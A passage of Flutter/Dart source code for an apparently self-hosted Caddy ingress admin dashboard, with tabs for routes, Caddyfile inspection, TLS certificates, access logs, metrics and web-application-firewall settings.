                                                          style: const TextStyle(fontFamily: 'Courier New', fontSize: 12),
                                                        ),
                                                        const SizedBox(width: 4),
                                                        const Icon(Icons.open_in_new, size: 11, color: Colors.grey),
                                                      ],
                                                    ),
                                                  ),
                                                ),
                                              ),
                                            );
                                          }),
                                        ],
                                      ),
                              ),

                              // THREAT SHIELD (WAF)
                              DataCell(Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  Container(
                                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                    decoration: BoxDecoration(
                                      color: wafEnabled
                                          ? (wafMode == 'detection' ? Colors.amber.withValues(alpha: 0.15) : Colors.green.withValues(alpha: 0.15))
                                          : Colors.grey.withValues(alpha: 0.15),
                                      borderRadius: BorderRadius.circular(6),
                                      border: Border.all(
                                        color: wafEnabled
                                            ? (wafMode == 'detection' ? Colors.amber : Colors.green)
                                            : Colors.grey.withValues(alpha: 0.4),
                                      ),
                                    ),
                                    child: Row(
                                      mainAxisSize: MainAxisSize.min,
                                      children: [
                                        Icon(
                                          wafEnabled ? Icons.shield : Icons.shield_outlined,
                                          size: 14,
                                          color: wafEnabled
                                              ? (wafMode == 'detection' ? Colors.amber : Colors.green)
                                              : Colors.grey,
                                        ),
                                        const SizedBox(width: 4),
                                        Text(
                                          wafEnabled ? (wafMode == 'detection' ? 'DETECT' : 'ENFORCE') : 'OFF',
                                          style: TextStyle(
                                            fontSize: 11,
                                            fontWeight: FontWeight.bold,
                                            color: wafEnabled
                                                ? (wafMode == 'detection' ? Colors.amber : Colors.green)
                                                : Colors.grey,
                                          ),
                                        ),
                                        if (wafOrigin == 'manual') ...[
                                          const SizedBox(width: 4),
                                          Container(
                                            padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 1),
                                            decoration: BoxDecoration(
                                              color: const Color(0xFFF97316).withValues(alpha: 0.2),
                                              borderRadius: BorderRadius.circular(4),
                                            ),
                                            child: const Text('a mano', style: TextStyle(fontSize: 9, color: Color(0xFFF97316), fontWeight: FontWeight.bold)),
                                          ),
                                        ],
                                      ],
                                    ),
                                  ),
                                  const SizedBox(width: 6),
                                  IconButton(
                                    icon: Icon(
                                      wafEnabled ? Icons.power_settings_new : Icons.play_arrow,
                                      size: 16,
                                      color: wafEnabled ? Colors.redAccent : Colors.green,
                                    ),
                                    tooltip: wafEnabled ? 'Disable WAF for $host (a mano)' : 'Enable WAF for $host (a mano)',
                                    onPressed: () async {
                                      final res = await ApiService.toggleRouteWAF(host, !wafEnabled, wafMode);
                                      _showSnackBar(res['message'] ?? 'Route WAF toggled');
                                      await _loadCaddyData();
                                    },
                                  ),
                                ],
                              )),

                              // HEALTH
                              DataCell(StatusBadge(label: r['health'] ?? 'healthy')),

                              // UPTIME %
                              DataCell(Text('${r['uptime_percent'] ?? 99.98}%', style: const TextStyle(fontWeight: FontWeight.bold))),

                              // ACTIONS / ENLACE
                              DataCell(Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  IconButton(
                                    icon: const Icon(Icons.open_in_new, size: 18, color: Color(0xFFF97316)),
                                    tooltip: 'Abrir $fullUrl en nueva pestaña',
                                    onPressed: () => _openUrl(fullUrl),
                                  ),
                                  IconButton(
                                    icon: const Icon(Icons.link, size: 18),
                                    tooltip: 'Copiar URL ($fullUrl)',
                                    onPressed: () {
                                      Clipboard.setData(ClipboardData(text: fullUrl));
                                      _showSnackBar('URL copiada: $fullUrl');
                                    },
                                  ),
                                  IconButton(
                                    icon: const Icon(Icons.terminal, size: 18),
                                    tooltip: 'Copiar comando cURL de prueba',
                                    onPressed: () {
                                      Clipboard.setData(ClipboardData(text: curlCmd));
                                      _showSnackBar('Copied test command: $curlCmd');
                                    },
                                  ),
                                ],
                              )),
                            ]);
                          }).toList(),
                        ),
                      ),
                    ),
            ),
          ],
        ),
      ),
    );
  }

  // --- TAB 3: Caddyfile ---
  Widget _buildCaddyfileTab(String caddyfile, ThemeData theme, bool isDark) {
    final blocks = _parseCaddyfile(caddyfile);
    final filteredBlocks = blocks.where((b) {
      if (_caddyfileFilter.isEmpty) return true;
      final q = _caddyfileFilter.toLowerCase();
      return b.host.toLowerCase().contains(q) ||
          b.url.toLowerCase().contains(q) ||
          b.upstreams.any((u) => u.toLowerCase().contains(q));
    }).toList();

    return Card(
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Top Control Bar
            Row(
              children: [
                const Icon(Icons.description, size: 22, color: Color(0xFFF97316)),
                const SizedBox(width: 8),
                Text('Caddyfile & Ingress Inspection', style: theme.textTheme.titleMedium?.copyWith(fontWeight: FontWeight.bold)),
                const SizedBox(width: 20),

                // View Mode Switcher
                Container(
                  decoration: BoxDecoration(
                    color: isDark ? const Color(0xFF0F172A) : const Color(0xFFF1F5F9),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: Colors.grey.withValues(alpha: 0.3)),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      _caddyfileViewButton('table', Icons.table_chart, 'Filas y Columnas', isDark),
                      _caddyfileViewButton('json', Icons.data_object, 'Formato JSON', isDark),
                      _caddyfileViewButton('raw', Icons.code, 'Caddyfile Raw', isDark),
                    ],
                  ),
                ),

                const Spacer(),

                if (_caddyfileViewMode == 'table') ...[
                  SizedBox(
                    width: 220,
                    height: 36,
                    child: TextField(
                      decoration: const InputDecoration(
                        prefixIcon: Icon(Icons.search, size: 16),
                        hintText: 'Filtrar reglas...',
                        isDense: true,
                        contentPadding: EdgeInsets.symmetric(horizontal: 10, vertical: 8),
                      ),
                      onChanged: (val) => setState(() => _caddyfileFilter = val),
                    ),
                  ),
                ],

                if (_caddyfileViewMode == 'raw') ...[
                  OutlinedButton.icon(
                    icon: const Icon(Icons.format_indent_increase, size: 16),
                    label: const Text('caddy fmt'),
                    onPressed: () async {
                      await ApiService.formatCaddyfile(caddyfile);
                      _showSnackBar('Formatted Caddyfile via caddy fmt!');
                      _loadCaddyData();
                    },
                  ),
                  const SizedBox(width: 8),
                  IconButton(
                    icon: const Icon(Icons.copy, size: 16),
                    tooltip: 'Copiar Caddyfile',
                    onPressed: () {
                      Clipboard.setData(ClipboardData(text: caddyfile));
                      _showSnackBar('Copied Caddyfile!');
                    },
                  ),
                ],

                if (_caddyfileViewMode == 'json') ...[
                  OutlinedButton.icon(
                    icon: const Icon(Icons.copy, size: 16),
                    label: const Text('Copiar JSON'),
                    onPressed: () {
                      final jsonStr = const JsonEncoder.withIndent('  ').convert(blocks.map((b) => b.toJson()).toList());
                      Clipboard.setData(ClipboardData(text: jsonStr));
                      _showSnackBar('JSON de rutas copiado al portapapeles!');
                    },
                  ),
                ],
              ],
            ),
            const SizedBox(height: 14),

            // Quick Ingress URLs bar (Click to open directly in a new tab!)
            if (blocks.isNotEmpty) ...[
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                decoration: BoxDecoration(
                  color: isDark ? const Color(0xFF0F172A).withValues(alpha: 0.6) : const Color(0xFFF8FAFC),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: Colors.grey.withValues(alpha: 0.2)),
                ),
                child: Row(
                  children: [
                    const Icon(Icons.open_in_new, size: 16, color: Color(0xFFF97316)),
                    const SizedBox(width: 8),
                    const Text('Ingress URLs detectadas:', style: TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: Colors.grey)),
                    const SizedBox(width: 8),
                    Expanded(
                      child: SingleChildScrollView(
                        scrollDirection: Axis.horizontal,
                        child: Row(
                          children: blocks.map((b) {
                            return Padding(
                              padding: const EdgeInsets.only(right: 8),
                              child: ActionChip(
                                avatar: Icon(
                                  b.scheme == 'https' ? Icons.lock : Icons.lock_open,
                                  size: 13,
                                  color: b.scheme == 'https' ? Colors.green : Colors.blue,
                                ),
                                label: Row(
                                  mainAxisSize: MainAxisSize.min,
                                  children: [
                                    Text(
                                      b.url,
                                      style: const TextStyle(fontSize: 11, fontWeight: FontWeight.w600),
                                    ),
                                    const SizedBox(width: 4),
                                    const Icon(Icons.arrow_outward, size: 11, color: Color(0xFFF97316)),
                                  ],
                                ),
                                tooltip: 'Abrir ${b.url} en nueva pestaña del navegador',
                                onPressed: () => _openUrl(b.url),
                              ),
                            );
                          }).toList(),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 14),
            ],

            // Active View Mode Body
            Expanded(
              child: _caddyfileViewMode == 'table'
                  ? _buildCaddyfileTableView(filteredBlocks, theme, isDark)
                  : (_caddyfileViewMode == 'json'
                      ? _buildCaddyfileJsonView(blocks, theme, isDark)
                      : _buildCaddyfileRawView(caddyfile, theme, isDark)),
            ),
          ],
        ),
      ),
    );
  }

  Widget _caddyfileViewButton(String mode, IconData icon, String label, bool isDark) {
    final isSelected = _caddyfileViewMode == mode;
    return InkWell(
      onTap: () => setState(() => _caddyfileViewMode = mode),
      borderRadius: BorderRadius.circular(6),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 7),
        decoration: BoxDecoration(
          color: isSelected ? const Color(0xFFF97316) : Colors.transparent,
          borderRadius: BorderRadius.circular(6),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, size: 14, color: isSelected ? Colors.white : (isDark ? Colors.grey[300] : Colors.grey[700])),
            const SizedBox(width: 6),
            Text(
              label,
              style: TextStyle(
                fontSize: 12,
                fontWeight: isSelected ? FontWeight.bold : FontWeight.normal,
                color: isSelected ? Colors.white : (isDark ? Colors.grey[300] : Colors.grey[700]),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCaddyfileTableView(List<CaddyParsedBlock> blocks, ThemeData theme, bool isDark) {
    if (blocks.isEmpty) {
      return Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(Icons.description_outlined, size: 48, color: Colors.grey.withValues(alpha: 0.5)),
            const SizedBox(height: 8),
            const Text('No se detectaron bloques de configuración Ingress en el Caddyfile', style: TextStyle(color: Colors.grey)),
          ],
        ),
      );
    }

    return SingleChildScrollView(
      scrollDirection: Axis.horizontal,
      child: SingleChildScrollView(
        child: DataTable(
          columns: const [
            DataColumn(label: Text('INGRESS HOST / ORIGEN')),
            DataColumn(label: Text('DESTINO (UPSTREAMS / PROXY)')),
            DataColumn(label: Text('TLS / CERTIFICADO')),
            DataColumn(label: Text('DIRECTIVAS / SEGURIDAD')),
            DataColumn(label: Text('ACCIONES')),
          ],
          rows: blocks.map((b) {
            return DataRow(cells: [
              // Ingress Host / Origin with link
              DataCell(
                InkWell(
                  onTap: () => _openUrl(b.url),
                  borderRadius: BorderRadius.circular(6),
                  child: Padding(
                    padding: const EdgeInsets.symmetric(vertical: 4, horizontal: 2),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                          decoration: BoxDecoration(
                            color: b.scheme == 'https'
                                ? Colors.green.withValues(alpha: 0.15)
                                : Colors.blue.withValues(alpha: 0.15),
                            borderRadius: BorderRadius.circular(4),
                            border: Border.all(
                              color: b.scheme == 'https'
                                  ? Colors.green.withValues(alpha: 0.4)
                                  : Colors.blue.withValues(alpha: 0.4),
                            ),
                          ),
                          child: Text(
                            b.scheme.toUpperCase(),
                            style: TextStyle(
                              fontSize: 10,
                              fontWeight: FontWeight.bold,
                              color: b.scheme == 'https' ? Colors.green : Colors.blue,
                            ),
                          ),
                        ),
                        const SizedBox(width: 8),
                        Text(
                          b.cleanHost,
                          style: TextStyle(
                            fontWeight: FontWeight.bold,
                            fontFamily: 'Courier New',
                            color: isDark ? const Color(0xFF38BDF8) : const Color(0xFF0284C7),
                            decoration: TextDecoration.underline,
                            decorationStyle: TextDecorationStyle.dotted,
                          ),
                        ),
                        const SizedBox(width: 6),
                        Icon(
                          Icons.open_in_new,
                          size: 14,
                          color: isDark ? const Color(0xFF38BDF8) : const Color(0xFF0284C7),
                        ),
                      ],
                    ),
                  ),
                ),
              ),

              // Destino (Upstreams / Proxy)
              DataCell(
                b.upstreams.isEmpty
                    ? const Text('—', style: TextStyle(color: Colors.grey))
                    : Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          const Icon(Icons.arrow_forward, size: 14, color: Color(0xFFF97316)),
                          const SizedBox(width: 6),
                          ...b.upstreams.map((u) {
                            final upUrl = u.startsWith('http://') || u.startsWith('https://')
                                ? u
                                : (u.contains(':443') ? 'https://$u' : 'http://$u');
                            return Padding(
                              padding: const EdgeInsets.only(right: 6),
                              child: InkWell(
                                onTap: () => _openUrl(upUrl),
                                borderRadius: BorderRadius.circular(4),
                                child: Tooltip(
                                  message: 'Abrir destino $upUrl en nueva pestaña',
                                  child: Container(
                                    padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                                    decoration: BoxDecoration(
                                      color: isDark ? const Color(0xFF0F172A) : const Color(0xFFF1F5F9),
                                      borderRadius: BorderRadius.circular(4),
                                      border: Border.all(color: Colors.grey.withValues(alpha: 0.3)),
                                    ),
                                    child: Row(
                                      mainAxisSize: MainAxisSize.min,
                                      children: [
                                        Text(
                                          u,
                                          style: const TextStyle(fontFamily: 'Courier New', fontSize: 12),
                                        ),
                                        const SizedBox(width: 4),
                                        const Icon(Icons.open_in_new, size: 11, color: Colors.grey),
                                      ],
                                    ),
                                  ),
                                ),
                              ),
                            );
                          }),
                        ],
                      ),
              ),

              // TLS / Certificado
              DataCell(
                Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(
                      b.tls.contains('internal') ? Icons.shield : Icons.lock,
                      size: 14,
                      color: Colors.purple,
                    ),
                    const SizedBox(width: 6),
                    Text(
                      b.tls,
                      style: const TextStyle(fontFamily: 'Courier New', fontSize: 12),
                    ),
                  ],
                ),
              ),

              // Directivas / Seguridad
              DataCell(
                Wrap(
                  spacing: 6,
                  runSpacing: 4,
                  children: [
                    if (b.wafEnabled)
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                        decoration: BoxDecoration(
                          color: b.wafMode == 'detection'
                              ? Colors.amber.withValues(alpha: 0.15)
                              : Colors.green.withValues(alpha: 0.15),
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(
                            color: b.wafMode == 'detection' ? Colors.amber : Colors.green,
                          ),
                        ),
                        child: Text(
                          'WAF: ${b.wafMode.toUpperCase()}',
                          style: TextStyle(
                            fontSize: 10,
                            fontWeight: FontWeight.bold,
                            color: b.wafMode == 'detection' ? Colors.amber : Colors.green,
                          ),
                        ),
                      ),
                    if (b.lbPolicy.isNotEmpty)
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                        decoration: BoxDecoration(
                          color: Colors.blue.withValues(alpha: 0.15),
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: Colors.blue.withValues(alpha: 0.4)),
                        ),
                        child: Text(
                          'LB: ${b.lbPolicy}',
                          style: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.blue),
                        ),
                      ),
                    if (b.healthUri.isNotEmpty)
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                        decoration: BoxDecoration(
                          color: Colors.teal.withValues(alpha: 0.15),
                          borderRadius: BorderRadius.circular(4),
                          border: Border.all(color: Colors.teal.withValues(alpha: 0.4)),
                        ),
                        child: Text(
                          'Health: ${b.healthUri}',
                          style: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.teal),
                        ),
                      ),
                  ],
                ),
              ),

              // Acciones
              DataCell(
                Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    IconButton(
                      icon: const Icon(Icons.open_in_new, size: 18, color: Color(0xFFF97316)),
                      tooltip: 'Abrir ${b.url} en el navegador',
                      onPressed: () => _openUrl(b.url),
                    ),
                    IconButton(
                      icon: const Icon(Icons.link, size: 18),
                      tooltip: 'Copiar URL (${b.url})',
                      onPressed: () {
                        Clipboard.setData(ClipboardData(text: b.url));
                        _showSnackBar('URL copiada: ${b.url}');
                      },
                    ),
                    IconButton(
                      icon: const Icon(Icons.copy, size: 18),
                      tooltip: 'Copiar bloque Caddyfile',
                      onPressed: () {
                        Clipboard.setData(ClipboardData(text: b.raw));
                        _showSnackBar('Bloque Caddyfile copiado');
                      },
                    ),
                  ],
                ),
              ),
            ]);
          }).toList(),
        ),
      ),
    );
  }

  Widget _buildCaddyfileJsonView(List<CaddyParsedBlock> blocks, ThemeData theme, bool isDark) {
    final jsonStr = const JsonEncoder.withIndent('  ').convert(blocks.map((b) => b.toJson()).toList());
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: isDark ? const Color(0xFF0D1117) : const Color(0xFFF1F5F9),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: theme.dividerColor),
      ),
      child: SingleChildScrollView(
        child: SelectableText(
          jsonStr.isEmpty ? '[]' : jsonStr,
          style: const TextStyle(fontFamily: 'Courier New', fontSize: 13),
        ),
      ),
    );
  }

  Widget _buildCaddyfileRawView(String caddyfile, ThemeData theme, bool isDark) {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: isDark ? const Color(0xFF0D1117) : const Color(0xFFF1F5F9),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: theme.dividerColor),
      ),
      child: SingleChildScrollView(
        child: SelectableText(
          caddyfile.isEmpty ? '# No configuration loaded' : caddyfile,
          style: const TextStyle(fontFamily: 'Courier New', fontSize: 13),
        ),
      ),
    );
  }

  // --- TAB 4: TLS Certificates ---
  Widget _buildCertsTab(ThemeData theme, bool isDark) {
    return Card(
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                const Icon(Icons.shield, size: 20, color: Color(0xFFF97316)),
                const SizedBox(width: 8),
                Text('Managed TLS Certificates', style: theme.textTheme.titleMedium?.copyWith(fontWeight: FontWeight.bold)),
                const Spacer(),
                FilledButton.icon(
                  style: FilledButton.styleFrom(backgroundColor: const Color(0xFF3B82F6)),
                  icon: _syncingCerts
                      ? const SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                      : const Icon(Icons.sync, size: 16),
                  label: Text(_syncingCerts ? 'Syncing...' : 'Sync to All Nodes'),
                  onPressed: _syncingCerts ? null : _syncCertsToAllNodes,
                ),
                const SizedBox(width: 8),
                FilledButton.icon(
                  style: FilledButton.styleFrom(backgroundColor: const Color(0xFFF97316)),
                  icon: const Icon(Icons.upload_file, size: 16),
                  label: const Text('Upload Custom Cert'),
                  onPressed: _showUploadCustomCertDialog,
                ),
                const SizedBox(width: 8),
                OutlinedButton.icon(
                  icon: const Icon(Icons.cleaning_services, size: 16),
                  label: const Text('Prune Orphaned'),
                  onPressed: _pruneOrphanedCerts,
                ),
                const SizedBox(width: 8),
                OutlinedButton.icon(
                  icon: const Icon(Icons.download, size: 16),
                  label: const Text('Root CA (root.crt)'),
                  onPressed: _downloadRootCACert,
                ),
                const SizedBox(width: 8),
                IconButton(
                  icon: const Icon(Icons.help_outline, size: 20),
                  tooltip: 'Trust Instructions for OS',
                  onPressed: _showOSInstallInstructions,
                ),
              ],
            ),
            const SizedBox(height: 16),
            Expanded(
              child: SingleChildScrollView(
                scrollDirection: Axis.horizontal,
                child: DataTable(
                  columns: const [
                    DataColumn(label: Text('DOMAIN / PATTERN')),
                    DataColumn(label: Text('ISSUER')),
                    DataColumn(label: Text('EXPIRATION')),
                    DataColumn(label: Text('KEY / ALGO')),
                    DataColumn(label: Text('STATUS')),
                    DataColumn(label: Text('ACTIONS')),
                  ],
                  rows: _certsList.map((c) {
                    final domain = c['domain'] ?? '';
                    final isOrphan = c['is_orphan'] == true;
                    final keyType = c['key_type'] ?? 'ECDSA (P-256)';

                    return DataRow(cells: [
                      DataCell(Row(
                        children: [
                          Text(domain, style: const TextStyle(fontWeight: FontWeight.bold, fontFamily: 'Courier New')),
                          if (isOrphan) ...[
                            const SizedBox(width: 6),
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(color: Colors.amber.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(4)),
                              child: const Text('orphan', style: TextStyle(fontSize: 10, color: Colors.amber, fontWeight: FontWeight.bold)),
                            ),
                          ],
                        ],
                      )),
                      DataCell(Text(c['issuer'] ?? '')),
                      DataCell(Text(c['expires_in'] ?? '')),
                      DataCell(Text(keyType, style: const TextStyle(fontSize: 11, fontFamily: 'Courier New'))),
                      DataCell(StatusBadge(label: c['status'] ?? 'active')),
                      DataCell(Row(
                        children: [
                          IconButton(
                            icon: const Icon(Icons.visibility, size: 16),
                            tooltip: 'Inspect Certificate (X.509 details)',
                            onPressed: () => _showCertDetailsDialog(c as Map<String, dynamic>),
                          ),
                          IconButton(
                            icon: const Icon(Icons.autorenew, size: 16, color: Color(0xFFF97316)),
                            tooltip: 'Force Renew / Rotate Certificate',
                            onPressed: () => _renewCert(domain),
                          ),
                          IconButton(
                            icon: const Icon(Icons.download, size: 16),
                            tooltip: 'Download Domain Certificate (.crt)',
                            onPressed: () => _downloadDomainCert(domain),
                          ),
                        ],
                      )),
                    ]);
                  }).toList(),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // --- TAB 5: Access Logs ---
  Widget _buildLogsTab(ThemeData theme, bool isDark) {
    final filteredLogs = _logsList.where((l) {
      if (_logSearch.isNotEmpty && !l.toLowerCase().contains(_logSearch.toLowerCase())) return false;
      if (_logLevelFilter != 'ALL' && !l.contains(_logLevelFilter)) return false;
      return true;
    }).toList();

    return Card(
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                SizedBox(
                  width: 260,
                  child: TextField(
                    decoration: const InputDecoration(
                      prefixIcon: Icon(Icons.search, size: 18),
                      hintText: 'Search log output...',
                      isDense: true,
                    ),
                    onChanged: (val) => setState(() => _logSearch = val),
                  ),
                ),
                const SizedBox(width: 12),
                DropdownButton<String>(
                  value: _logLevelFilter,
                  onChanged: (val) {
                    if (val != null) setState(() => _logLevelFilter = val);
                  },
                  items: const [
                    DropdownMenuItem(value: 'ALL', child: Text('All Levels')),
                    DropdownMenuItem(value: 'INFO', child: Text('INFO')),
                    DropdownMenuItem(value: 'WARN', child: Text('WARN')),
                    DropdownMenuItem(value: 'ERROR', child: Text('ERROR')),
                  ],
                ),
                const Spacer(),
                IconButton(
                  icon: const Icon(Icons.copy, size: 16),
                  tooltip: 'Copy logs',
                  onPressed: () {
                    Clipboard.setData(ClipboardData(text: filteredLogs.join('\n')));
                    _showSnackBar('Copied log lines!');
                  },
                ),
              ],
            ),
            const SizedBox(height: 16),
            Expanded(
              child: Container(
                width: double.infinity,
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: isDark ? const Color(0xFF0D1117) : const Color(0xFFF1F5F9),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: SingleChildScrollView(
                  child: SelectableText(
                    filteredLogs.isEmpty ? '# No logs found' : filteredLogs.join('\n'),
                    style: const TextStyle(fontFamily: 'Courier New', fontSize: 11.5),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // --- TAB 6: Log Configuration ---
  Widget _buildLogConfigTab(ThemeData theme, bool isDark) {
    return Card(
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('Access Logging Settings', style: theme.textTheme.titleMedium?.copyWith(fontWeight: FontWeight.bold)),
            const SizedBox(height: 8),
            Text('Enable or disable JSON access logging across site blocks.', style: theme.textTheme.bodyMedium),
            const SizedBox(height: 20),
            SwitchListTile(
              title: const Text('Enable Access Logging (log block in Caddyfile)'),
              subtitle: const Text('Streams JSON formatted request logs to container stdout'),
              value: _accessLoggingEnabled,
              activeColor: const Color(0xFFF97316),
              onChanged: (val) {
                setState(() => _accessLoggingEnabled = val);
                _showSnackBar('Access logging configuration updated!');
              },
            ),
          ],
        ),
      ),
    );
  }

  // --- TAB 7: Metrics ---
  Widget _buildMetricsTab(ThemeData theme, bool isDark) {
    final rps = _metricsData['rps'] ?? 12.8;
    final latency = _metricsData['avg_latency_ms'] ?? 14.5;
    final p95 = _metricsData['p95_latency_ms'] ?? 31.0;
    final reqs = _metricsData['request_count'] ?? 14850;

    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Expanded(child: _metricCard('Requests / sec', '${rps} RPS', Icons.speed, Colors.orange, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Avg Latency', '${latency} ms', Icons.timer, Colors.blue, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('p95 Latency', '${p95} ms', Icons.bar_chart, Colors.purple, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Total Requests', '$reqs', Icons.numbers, Colors.green, theme)),
            ],
          ),
          const SizedBox(height: 16),
          Card(
            child: Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text('HTTP Response Codes Breakdown', style: theme.textTheme.titleSmall?.copyWith(fontWeight: FontWeight.bold)),
                  const SizedBox(height: 16),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceAround,
                    children: [
                      _statusChip('2xx Success', '14,200', Colors.green),
                      _statusChip('3xx Redirect', '450', Colors.blue),
                      _statusChip('4xx Client Error', '180', Colors.orange),
                      _statusChip('5xx Server Error', '20', Colors.red),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _statusChip(String label, String val, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.15),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: color.withValues(alpha: 0.4)),
      ),
      child: Column(
        children: [
          Text(label, style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold, color: color)),
          const SizedBox(height: 4),
          Text(val, style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: color)),
        ],
      ),
    );
  }

  // --- TAB 8: WAF & Threat Shield ---
  Widget _buildWAFTab(ThemeData theme, bool isDark) {
    final enabled = _wafConfig['enabled'] == true;
    final mode = _wafConfig['mode'] ?? 'enforce';
    final paranoia = (_wafConfig['paranoia_level'] as num?)?.toInt() ?? 1;
    final requestsEval = _wafStats['total_requests_evaluated'] ?? _wafConfig['total_requests_evaluated'] ?? 0;
    final blockedAttacks = _wafStats['total_blocked_attacks'] ?? _wafConfig['total_blocked_attacks'] ?? 0;
    final activeRoutes = _wafStats['active_waf_routes_count'] ?? 0;
    final blacklistedCount = _wafStats['blacklisted_ips_count'] ?? 0;

    final blockSQLi = _wafConfig['block_sqli'] ?? true;
    final blockXSS = _wafConfig['block_xss'] ?? true;
    final blockRCE = _wafConfig['block_rce'] ?? true;
    final blockLFI = _wafConfig['block_lfi'] ?? true;
    final blockScanners = _wafConfig['block_scanners'] ?? true;

    final blacklistedIPs = (_wafConfig['blacklisted_ips'] ?? '').toString().split(',').where((s) => s.trim().isNotEmpty).toList();

    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // Master Switch Card
          Card(
            child: Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Icon(
                        enabled ? Icons.security : Icons.shield_outlined,
                        size: 32,
                        color: enabled ? (mode == 'detection' ? Colors.amber : Colors.green) : Colors.grey,
                      ),
                      const SizedBox(width: 14),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Row(
                              children: [
                                Text(
                                  'Caddy Ingress Threat Shield & Web Application Firewall (WAF)',
                                  style: theme.textTheme.titleMedium?.copyWith(fontWeight: FontWeight.bold),
                                ),
                                const SizedBox(width: 10),
                                Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 3),
                                  decoration: BoxDecoration(
                                    color: enabled
                                        ? (mode == 'detection' ? Colors.amber.withValues(alpha: 0.2) : Colors.green.withValues(alpha: 0.2))
                                        : Colors.red.withValues(alpha: 0.2),
                                    borderRadius: BorderRadius.circular(12),
                                    border: Border.all(
                                      color: enabled ? (mode == 'detection' ? Colors.amber : Colors.green) : Colors.red,
                                    ),
                                  ),
                                  child: Text(
                                    enabled ? (mode == 'detection' ? '🟡 DETECTION ONLY' : '🟢 ACTIVE (ENFORCING)') : '🔴 DISABLED',
                                    style: TextStyle(
                                      fontSize: 11,
                                      fontWeight: FontWeight.bold,
                                      color: enabled ? (mode == 'detection' ? Colors.amber : Colors.green) : Colors.red,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                            const SizedBox(height: 4),
                            Text(
                              'Air-gapped Layer 7 threat defense built natively into Caddy Ingress. Supports manual override ("a mano") and Compose labels.',
                              style: theme.textTheme.bodySmall?.copyWith(color: theme.colorScheme.onSurface.withValues(alpha: 0.6)),
                            ),
                          ],
                        ),
                      ),
                      Switch(
                        value: enabled,
                        activeColor: const Color(0xFFF97316),
                        onChanged: (val) {
                          setState(() {
                            _wafConfig['enabled'] = val;
                          });
                        },
                      ),
                    ],
                  ),
                  const Divider(height: 28),
                  Row(
                    children: [
                      const Text('Operating Mode: ', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
                      const SizedBox(width: 8),
                      DropdownButton<String>(
